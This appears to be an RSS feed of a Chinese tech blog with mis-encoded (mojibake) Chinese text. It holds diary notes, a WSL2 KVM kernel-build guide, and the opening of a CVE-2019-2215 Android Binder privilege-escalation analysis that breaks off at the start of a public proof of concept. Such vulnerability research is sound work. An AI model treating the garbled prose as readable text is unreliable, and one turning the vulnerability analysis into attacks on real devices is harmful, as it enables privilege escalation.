<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on ykikoqAq</title><link>https://ykiko.top/post/</link><description>Recent content in Posts on ykikoqAq</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sun, 01 Jan 2023 00:00:00 +0800</lastBuildDate><atom:link href="https://ykiko.top/post/index.xml" rel="self" type="application/rss+xml"/><item><title>ç¼–è¯‘åŸç†ç¬”è®°</title><link>https://ykiko.top/p/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/</link><pubDate>Sun, 01 Jan 2023 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/</guid><description>&lt;h1 id="ç¼–è¯‘åŸç†ç¬”è®°">ç¼–è¯‘åŸç†ç¬”è®°&lt;/h1>
&lt;p>ç¬”è®°å¾…è¿ç§»ï¼Œå…ˆå ä½ã€‚&lt;/p></description></item><item><title>ç¢ç¢å¿µ</title><link>https://ykiko.top/p/%E7%A2%8E%E7%A2%8E%E5%BF%B5/</link><pubDate>Sun, 01 Jan 2023 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/%E7%A2%8E%E7%A2%8E%E5%BF%B5/</guid><description>&lt;h1 id="ç¢ç¢å¿µ">ç¢ç¢å¿µ&lt;/h1>
&lt;p>2023-08-26 | æƒ³èµ·äº†èŠ±ï¼Œä»å°å°±çˆ±èŠ±ğŸŒ¸ã€‚å¥½ä¹…æ²¡ä¹°èŠ±äº†ï¼Œä»Šå¤©è·¯è¿‡èŠ±åº—ï¼Œçœ‹åˆ°å‡ æŸè¿˜æœªå¼€æ”¾çš„ã€‚æˆ‘æƒ³äº†æƒ³ï¼Œç›´åˆ°ç°åœ¨ï¼Œä¸€å…±æ”¶åˆ°è¿‡ä¸‰æ¬¡èŠ±ï¼Œç¬¬ä¸€æ¬¡æ˜¯å’ŒæŸäººç¬¬ä¸€æ¬¡è§é¢æ—¶å¥¹å¸¦çš„ä¸€å¤§æ§å…¨çº¢çš„èŠ±(ä¸è®°å¾—èŠ±å)ï¼Œå¥¹è¯´è¿™ä»£è¡¨çƒ­çƒˆçš„çˆ±ï¼Œç¬¬äºŒæ¬¡æ˜¯1024æŸäººæ·˜å®ç»™æˆ‘ä¹°çš„å¹²èŠ±ã€‚ç¬¬ä¸‰æ¬¡æ˜¯æŸäººåœ¨æˆ‘ç”Ÿæ—¥æ—¶ç»™æˆ‘é€çš„äº²æ‰‹ç»‡çš„è£…é¥°èŠ±å½“åšç”Ÿæ—¥ç¤¼ç‰©ã€‚æˆ‘è®°å¿†ä¸­å°±é€è¿‡åˆ«äººä¸€æ¬¡èŠ±ï¼Œå»è§æŸäººæ—¶ï¼Œè·¯è¿‡èŠ±åº—å°±æŒ‘äº†å‡ æ”¯ä¸åŒçš„èŠ±è£…æˆä¸€æŸå¸¦äº†è¿‡å»ã€‚&lt;/p>
&lt;p>2023-08-01 | å…³äºçŒ«ã€‚è¿™æ˜¯æˆ‘å…»çš„ç¬¬ä¸‰åªçŒ«ï¼Œæˆ‘å«å®ƒå…«æ¡(ç°åœ¨å¬åˆ°æˆ‘å–Šå…«æ¡å°±å–µå–µå«)ã€‚&lt;/p>
&lt;p>2023-08-27 | æ²¡æ—¥æ²¡å¤œçš„æ‰“åšå¾·ä¹‹é—¨3ã€‚&lt;/p></description></item><item><title>ç¼–è¯‘åŸç†ç¬”è®°-å¼€ç¯‡</title><link>https://ykiko.top/p/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0-%E5%BC%80%E7%AF%87/</link><pubDate>Fri, 07 Jan 2022 00:22:00 +0800</pubDate><guid>https://ykiko.top/p/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0-%E5%BC%80%E7%AF%87/</guid><description>&lt;h1 id="ç¼–è¯‘åŸç†ç¬”è®°-å¼€ç¯‡">ç¼–è¯‘åŸç†ç¬”è®°-å¼€ç¯‡&lt;/h1>
&lt;p>ç¬”è®°å¾…è¿ç§»ï¼Œå…ˆå ä½ã€‚&lt;/p></description></item><item><title>WSL2å¼€å¯kvm</title><link>https://ykiko.top/p/wsl2%E5%BC%80%E5%90%AFkvm/</link><pubDate>Fri, 24 Jul 2020 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/wsl2%E5%BC%80%E5%90%AFkvm/</guid><description>&lt;h1 id="wsl2å¼€å¯kvm">WSL2å¼€å¯kvm&lt;/h1>
&lt;h3 id="0x00-å‰è¨€">0x00 å‰è¨€&lt;/h3>
&lt;p>ä¹‹å‰æƒ³ç€ç”¨wsl2å»è·‘qemuï¼Œå‘ç°å¾ˆå¤šå†…æ ¸pwné¢˜ç»™çš„ç¯å¢ƒéœ€è¦å¼€å¯&lt;code>-enable-kvm&lt;/code>é€‰é¡¹ï¼Œè¿˜æœ‰è‡ªå·±ç¼–è¯‘çš„å†…æ ¸ä¹Ÿæ²¡æ³•ï¼Œç„¶è€Œwsl2æ²¡æ³•å¼€å¯kvmï¼Œè§£å†³åŠæ³•å°±æ˜¯å»æŠŠhype-vç»™å…³äº†ï¼Œè€è€å®å®ç”¨vmware/vmboxå¼€ä¸ªè™šæ‹Ÿæœºï¼Œè¿™æ ·æ¯æ¬¡éƒ½è¦åˆ‡æ¥åˆ‡å»å¾ˆéº»çƒ¦ã€‚&lt;/p>
&lt;p>ç›´åˆ°çœ‹åˆ°vmwareå’Œvmboxéƒ½å¯ä»¥ä¸hype-vå¹¶å­˜ï¼Œä»¥ä¸ºçœ‹åˆ°äº†æ›™å…‰ï¼Œæ²¡æƒ³åˆ°æ˜¯æ²¡æ³•å¼€å¯è™šæ‹ŸåŒ–é€‰é¡¹çš„ã€‚&lt;/p>
&lt;p>åæ¥çœ‹åˆ°WSLä¸Šè¿™ä¸ª&lt;a class="link" href="https://github.com/microsoft/WSL/issues/4193" target="_blank" rel="noopener"
>Issues&lt;/a>ï¼Œå½“æ—¶ä¹Ÿæ²¡è¿™ä¹ˆå¤šè¯„è®ºï¼Œä¸è¿‡æš‚ä¸”èƒ½ç”¨&lt;a class="link" href="https://gist.github.com/offlinehacker/b1d96515f87a47bd0b0bea574eab5583" target="_blank" rel="noopener"
>è„šæœ¬&lt;/a>å®ç°ã€‚ä¸è¿‡è¿˜æ˜¯å¾ˆéº»çƒ¦ã€‚&lt;/p>
&lt;p>æœ€åçœ‹äº†è¿™ç¯‡&lt;a class="link" href="https://boxofcables.dev/accelerated-kvm-guests-on-wsl-2/" target="_blank" rel="noopener"
>æ–‡ç« &lt;/a>ï¼Œè·Ÿç€è¯•äº†ä¸€éï¼Œä¸€ç›´æ²¡æŠ¥é”™ï¼Œæœ€åè¿˜æ˜¯ä¸è¡Œã€‚æŸå¤©åˆå»çœ‹äº†çœ‹issuseï¼Œå‘ç°è¿™ä¸ªåŠæ³•è¦æœ€æ–°é˜…è§ˆç‰ˆã€‚æ›´æ–°åä¸€ä¸ªæ–°çš„å‘ç°å°±æ˜¯wsl2é€Ÿåº¦æ˜æ˜¾å˜å¿«äº†ã€‚ã€‚&lt;/p>
&lt;h3 id="0x01-ç¯å¢ƒ">0x01 ç¯å¢ƒ&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Windows 10 2004 20175.1000&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Windows Feature Experience Pack 120.18201.0.0&lt;/p>
&lt;/li>
&lt;li>
&lt;p>wsl2 - Ubuntu 20&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Intel i7-8550U&lt;/p>
&lt;/li>
&lt;li>
&lt;p>WSL-Linux-kernel: &lt;a class="link" href="https://github.com/microsoft/WSL2-Linux-Kernel/releases/tag/4.19.121-microsoft-standard" target="_blank" rel="noopener"
>4.19.121-microsoft-standard&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>qemu 5.0&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-ç¼–è¯‘kernel">0x02 ç¼–è¯‘Kernel&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo apt -y install build-essential libncurses-dev bison flex libssl-dev libelf-dev cpu-checker qemu-kvm
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tar -xf WSL2-Linux-Kernel-4.19.121-microsoft-standard.tar.gz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> WSL2-Linux-Kernel-4.19.104-microsoft-standard/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## cp Microsoft/config-wsl .config æœ‰bug ä½¿ç”¨æœ€æ–°ç‰ˆcommitå·²ä¿®å¤&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make menuconfig
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>.config&lt;/code>æ–‡ä»¶ç”¨&lt;a class="link" href="https://github.com/microsoft/WSL/files/4830946/config.txt" target="_blank" rel="noopener"
>è¿™ä¸ª&lt;/a> æˆ–è€…&lt;a class="link" href="https://github.com/microhobby/WSL2-Linux-Kernel/blob/5e3fa9a98ea1ac05b397e0acd5bf08ce0e60bd3e/Microsoft/config-wsl" target="_blank" rel="noopener"
>è¿™ä¸ª&lt;/a>&lt;/p>
&lt;p>ç¡®ä¿é‡Œé¢çš„é€‰é¡¹kvmçš„é€‰é¡¹ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200724222001.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>è¿™é‡Œå¯é€‰çš„ç¼–è¯‘ä¸º&amp;lt; M &amp;gt; æ¨¡å—æˆ–è€…&amp;lt; * &amp;gt; å†…ç½®ï¼Œå»ºè®®å†…ç½®å—æ¨¡å—çš„è¯åç»­æ¯æ¬¡é‡å¯éƒ½å¾—è‡ªå·±åŠ è½½ä¸€æ¬¡ã€‚&lt;/p>
&lt;p>ç¡®ä¿Linux guest support enableé€‰é¡¹ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200724221933.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>é€€å‡ºä¿å­˜ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">make -j8
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>waittingâ€¦â€¦â€¦â€¦&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">cp arch/x86/boot/bzImage /mnt/c/Users/&amp;lt;username&amp;gt;/bzImage
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nano /mnt/c/Users/&amp;lt;username&amp;gt;/.wslconfig
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">### å¦‚æœæ˜¯ &amp;lt;M&amp;gt; æ¨¡å—ç¼–è¯‘&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo make modules_install
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-toml" data-lang="toml">&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="nx">wsl2&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">nestedVirtualization&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="kc">true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">kernel&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="err">:\\&lt;/span>&lt;span class="nx">Users&lt;/span>&lt;span class="err">\\&amp;lt;&lt;/span>&lt;span class="nx">username&lt;/span>&lt;span class="err">&amp;gt;\\&lt;/span>&lt;span class="nx">bzImage&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">debugConsole&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="kc">true&lt;/span> &lt;span class="c">##å¯é€‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">pageReporting&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="kc">true&lt;/span> &lt;span class="c">##å¯é€‰&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">wsl.exe --shutdown Ubuntu
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wsl.exe -d Ubuntu
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nano /etc/modprobe.d/kvm-nested.conf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>modåŠ è½½çš„è¯è¿˜è¦å†™å…¥ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">options kvm-intel &lt;span class="nv">nested&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">options kvm-intel &lt;span class="nv">enable_shadow_vmcs&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">options kvm-intel &lt;span class="nv">enable_apicv&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">options kvm-intel &lt;span class="nv">ept&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¹‹å‰æ¨¡å—ç¼–è¯‘çš„æœ‰bugç‰ˆæœ¬çš„å›¾ mountæ— æ³•æŒ‚è½½ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200724214713.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æˆåŠŸçš„å›¾ å¯ä»¥æŒ‚è½½ã€‚ã€‚æ— éœ€æ‰‹åŠ¨åŠ è½½mod&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200724223913.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>è¦å…ˆé…ç½®ç•Œé¢ä»¥åŠGPUæ”¯æŒå¯ä»¥å‚è€ƒè¿™ç¯‡&lt;a class="link" href="https://boxofcables.dev/accelerated-kvm-guests-on-wsl-2/" target="_blank" rel="noopener"
>æ–‡ç« &lt;/a>åç»­çš„éƒ¨åˆ†ï¼Œæ²¡è¿™ä¸ªéœ€æ±‚ã€‚ã€‚&lt;/p>
&lt;h3 id="issuse">issuse&lt;/h3>
&lt;p>è¿˜æ˜¯ä¼šé‡åˆ°å¥‡å¥‡æ€ªæ€ªçš„å‘ã€‚&lt;/p>
&lt;p>&lt;code>An error occurred mounting one of your file systems. Please run 'dmesg' for more details.&lt;/code>&lt;/p>
&lt;p>æŠ¥é”™ä¿¡æ¯ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> 2.268879&lt;span class="o">]&lt;/span> init: &lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span> ERROR: MountPlan9WithRetry:282: mount drvfs on /mnt/c &lt;span class="o">(&lt;/span>&lt;span class="nv">cache&lt;/span>&lt;span class="o">=&lt;/span>mmap,noatime,msize&lt;span class="o">=&lt;/span>262144,trans&lt;span class="o">=&lt;/span>virtio,aname&lt;span class="o">=&lt;/span>drvfs&lt;span class="p">;&lt;/span>&lt;span class="nv">path&lt;/span>&lt;span class="o">=&lt;/span>C:&lt;span class="se">\;&lt;/span>&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span>&lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span>&lt;span class="nv">symlinkroot&lt;/span>&lt;span class="o">=&lt;/span>/mnt/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> 2.268880&lt;span class="o">]&lt;/span> &lt;span class="o">)&lt;/span> failed: &lt;span class="m">22&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> 2.277772&lt;span class="o">]&lt;/span> 9pnet: Could not find request transport: virtio
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> 2.280962&lt;span class="o">]&lt;/span> init: &lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span> ERROR: MountPlan9WithRetry:282: mount drvfs on /mnt/d &lt;span class="o">(&lt;/span>&lt;span class="nv">cache&lt;/span>&lt;span class="o">=&lt;/span>mmap,noatime,msize&lt;span class="o">=&lt;/span>262144,trans&lt;span class="o">=&lt;/span>virtio,aname&lt;span class="o">=&lt;/span>drvfs&lt;span class="p">;&lt;/span>&lt;span class="nv">path&lt;/span>&lt;span class="o">=&lt;/span>D:&lt;span class="se">\;&lt;/span>&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span>&lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span>&lt;span class="nv">symlinkroot&lt;/span>&lt;span class="o">=&lt;/span>/mnt/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> 2.280964&lt;span class="o">]&lt;/span> &lt;span class="o">)&lt;/span> failed: &lt;span class="m">22&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> 2.305491&lt;span class="o">]&lt;/span> init: &lt;span class="o">(&lt;/span>8&lt;span class="o">)&lt;/span> ERROR: CreateProcessParseCommon:874: Failed to translate D:&lt;span class="se">\o&lt;/span>penSRC&lt;span class="se">\W&lt;/span>SL2-Linux-Kernel-4.19.121-microsoft-standard
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> 2.312584&lt;span class="o">]&lt;/span> init: &lt;span class="o">(&lt;/span>8&lt;span class="o">)&lt;/span> ERROR: UtilTranslatePathList:2624: Failed to translate D:&lt;span class="se">\L&lt;/span>ife_Tools&lt;span class="se">\S&lt;/span>ys_Tools&lt;span class="se">\c&lt;/span>mder&lt;span class="se">\b&lt;/span>in
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> 2.319445&lt;span class="o">]&lt;/span> init: &lt;span class="o">(&lt;/span>8&lt;span class="o">)&lt;/span> ERROR: UtilTranslatePathList:2624: Failed to translate D:&lt;span class="se">\L&lt;/span>ife_Tools&lt;span class="se">\S&lt;/span>ys_Tools&lt;span class="se">\c&lt;/span>mder&lt;span class="se">\v&lt;/span>endor&lt;span class="se">\b&lt;/span>in
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¿™æ˜¯å†…æ ¸çš„é—®é¢˜ï¼Œå¾ˆå‘çš„åœ°æ–¹ã€‚æ˜¯å®˜ç½‘æ²¡åˆ‡æ¢æ–°çš„configæ–‡ä»¶é€ æˆçš„ï¼Œæ¢æˆæ–°çš„é‡æ–°ç¼–è¯‘å³å¯ã€‚å…·ä½“çœ‹ç€è¿™ä¸ª&lt;a class="link" href="https://github.com/microsoft/WSL/issues/5481" target="_blank" rel="noopener"
>issuse&lt;/a> &lt;a class="link" href="https://github.com/microsoft/WSL2-Linux-Kernel/pull/146/commits/5e3fa9a98ea1ac05b397e0acd5bf08ce0e60bd3e" target="_blank" rel="noopener"
>ä¿®å¤&lt;/a>&lt;/p>
&lt;p>é‡æ–°ç¼–è¯‘å†…æ ¸ã€‚&lt;/p>
&lt;h3 id="å‚è€ƒ">å‚è€ƒ&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://boxofcables.dev/accelerated-kvm-guests-on-wsl-2/" target="_blank" rel="noopener"
>https://boxofcables.dev/accelerated-kvm-guests-on-wsl-2/&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/microsoft/WSL/issues/4193" target="_blank" rel="noopener"
>https://github.com/microsoft/WSL/issues/4193&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>CVE-2019-2215åˆ†æåˆ©ç”¨è®°å½•</title><link>https://ykiko.top/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</link><pubDate>Tue, 30 Jun 2020 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</guid><description>&lt;h1 id="cve-2019-2215åˆ†æåˆ©ç”¨è®°å½•">CVE-2019-2215åˆ†æåˆ©ç”¨è®°å½•&lt;/h1>
&lt;h3 id="0x00-å‰è¨€">0x00 å‰è¨€&lt;/h3>
&lt;p>&lt;a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2215" target="_blank" rel="noopener"
>CVE-2019-2215&lt;/a>æœ€åˆæ˜¯ç”±syzbot(syzkaller bot)åœ¨2017å¹´å‘ç°çš„ä¸€ä¸ª&lt;a class="link" href="https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/eLGkcwk9AQAJ" target="_blank" rel="noopener"
>bug&lt;/a>ï¼Œåœ¨2018å¹´åˆè¯¥bugè¢«ä¿®å¤ï¼Œæ²¡æœ‰åˆ†é…CVEç¼–å·ï¼Œä½†æ˜¯è¯¥è¡¥ä¸æ²¡æœ‰å‘åç§»æ¤åˆ°è®¸å¤šå·²å‘å¸ƒçš„è®¾å¤‡ä¸Š,æ¯”å¦‚Pixelå’Œpixel2ã€‚&lt;/p>
&lt;p>&lt;strong>Project Zero&lt;/strong>çš„**Maddie Stone (@maddiestone)**æ ¹æ®Googleçš„å¨èƒæƒ…æŠ¥å°ç»„ï¼ˆTAGï¼‰çš„æƒ…æŠ¥æŠ¥å‘Šå†æ¬¡å‘ç°çš„è¯¥bugï¼Œå¥¹åœ¨2019å¹´9æœˆæŠ¥å‘Šäº†è¯¥&lt;a class="link" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942" target="_blank" rel="noopener"
>æ¼æ´&lt;/a>ã€‚TAGç¡®è®¤å…¶å·²ç”¨äºç°å®æ”»å‡»ä¸­ï¼ŒTAGè¡¨ç¤ºè¯¥æ¼æ´åˆ©ç”¨å¯èƒ½è·Ÿä¸€å®¶å‡ºå”®æ¼æ´å’Œåˆ©ç”¨å·¥å…·çš„ä»¥è‰²åˆ—å…¬å¸NSOæœ‰å…³ï¼ŒéšåNSOé›†å›¢å‘è¨€äººå…¬å¼€å¦è®¤ä¸è¯¥æ¼æ´å­˜åœ¨ä»»ä½•å…³ç³»ã€‚&lt;/p>
&lt;h3 id="0x01-åˆ†æç¯å¢ƒ">0x01 åˆ†æç¯å¢ƒ&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Android avd api29 x86_64&lt;/p>
&lt;/li>
&lt;li>
&lt;p>kernelï¼šq-goldfish-android-goldfish-4.14-dev commit id &lt;code>7a3cee43e935b9d526ad07f20bf005ba7e74d05b&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>pixel Android 10 kernel 3.18&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-æ¼æ´åˆ†æ">0x02 æ¼æ´åˆ†æ&lt;/h3>
&lt;p>æ¼æ´ä¸ºå†…æ ¸ä¸ŠBind IPCçš„ä¸€ä¸ªUAFæ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨å¯æœ¬åœ°ææƒï¼Œæ— éœ€è¿›è¡Œä»»ä½•äº¤äº’ï¼Œå·²è¢«æ¶æ„è½¯ä»¶åˆ©ç”¨ã€‚&lt;/p>
&lt;h3 id="åŸç†åˆ†æ">åŸç†åˆ†æ&lt;/h3>
&lt;p>å…ˆçœ‹ä¸€ä¸ªproject-zeroå…¬å¼€çš„&lt;a class="link" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942" target="_blank" rel="noopener"
>poc&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">binder_poll() passes the thread-&amp;gt;wait waitqueue that
